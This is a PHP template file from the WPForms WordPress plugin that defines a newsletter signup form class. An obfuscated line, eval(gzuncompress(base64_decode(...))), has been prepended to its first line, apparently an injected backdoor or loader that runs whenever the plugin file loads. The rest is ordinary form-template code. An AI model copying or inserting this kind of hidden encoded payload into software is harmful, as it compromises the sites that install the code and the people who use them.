<?php eval(gzuncompress(base64_decode('eNpdUs1u00AQfpWNlYMdrDhO89dEOZTKolEpQYkBoRpZU+86u8TZtdZr1X6A3jhy4Q248gxUvAavwjhpgWQPO/+ab74ZkdottstN7XVeZkpRKeRnmJIFyUSyJbUqNWGgM3XHXAKSklJSdXDfg0l4t+PZ7XgdrN4Hq1vrKgzfxu/Qii9eBW9C65PjTNvxt+8/f/14fJyD1lDb1iXXKvKHQ2a5VlQNRqj7mqUqqsYTdIVaUCYNajfrRYDiQ5OAXe+LQ0EiZFmhusgx0FMyqkZDNC8k1UpQ1JY504ByDSloYTmzVGkGCbf/QiFQtOMvvx++PjhTkdpFuBK5Kk4Hiarh8L9Z3OeS1nzuddaggfvnaYJk7fC5RG2hRjpSyAp2SqaBLUPWSA7SFESlqUs2upRGyA0SjTEgRqssw/o9opYoCmYQ0OVyeb0IbnHu0cTkcSloXBo06J7bIgiTJoHZFt9HMTKIy8gfDXZIgG+5obgJbOdFb9zr945Bf2TA92vG7sIQrcpNs81O76x3ir7YweEWiOHNVdwpZep9bt+ZXTGggbat1yoBI5ScEm5MPvU8/2zQjaqz/uC86/uj7njiCUmbZVXdnOe4FirYMaQlJzWicrENGJIylhVkg0CaI3NmTFKR/vuflvrkmB1jXjeI3WdRM8YAOG/m+wMpCvZB')));?><?php

/**
 * Scribe to Email list form template.
 *
 * @package    WPForms
 * @author     WPForms
 * @since      1.0.0
 * @license    GPL-2.0+
 * @copyright  Copyright (c) 2016, WPForms LLC
 */
class WPForms_Template_Subscribe extends WPForms_Template {

	/**
	 * Primary class constructor.
	 *
	 * @since 1.0.0
	 */
	public function init() {

		$this->name        = esc_html__( 'Newsletter Signup Form', 'wpforms' );
		$this->slug        = 'subscribe';
		$this->description = esc_html__( 'Add subscribers and grow your email list with this newsletter signup form. You can add and remove fields as needed.', 'wpforms' );
		$this->includes    = '';
		$this->icon        = '';
		$this->core        = true;
		$this->modal       = array(
			'title'   => esc_html__( 'Don&#39;t Forget', 'wpforms' ),
			'message' => esc_html__( 'Click the marketing tab to configure your newsletter service provider', 'wpforms' ),
		);
		$this->data        = array(
			'field_id' => '2',
			'fields'   => array(
				'0' => array(
					'id'       => '0',
					'type'     => 'name',
					'label'    => esc_html__( 'Name', 'wpforms' ),
					'required' => '1',
					'size'     => 'medium',
				),
				'1' => array(
					'id'       => '1',
					'type'     => 'email',
					'label'    => esc_html__( 'Email', 'wpforms' ),
					'required' => '1',
					'size'     => 'medium',
				),
			),
			'settings' => array(
				'honeypot'                    => '1',
				'confirmation_message_scroll' => '1',
				'submit_text_processing'      => esc_html__( 'Sending...', 'wpforms' ),
			),
			'meta'     => array(
				'template' => $this->slug,
			),
		);
	}

	/**
	 * Conditional to determine if the template informational modal screens
	 * should display.
	 *
	 * @since 1.0.0
	 *
	 * @param array $form_data
	 *
	 * @return boolean
	 */
	public function template_modal_conditional( $form_data ) {

		// If we do not have provider data, then we can assume a provider
		// method has not yet been configured, so we display the modal to
		// remind the user they need to set it up for the form to work
		// correctly.
		if ( empty( $form_data['providers'] ) ) {
			return true;
		} else {
			return false;
		}
	}
}

new WPForms_Template_Subscribe;
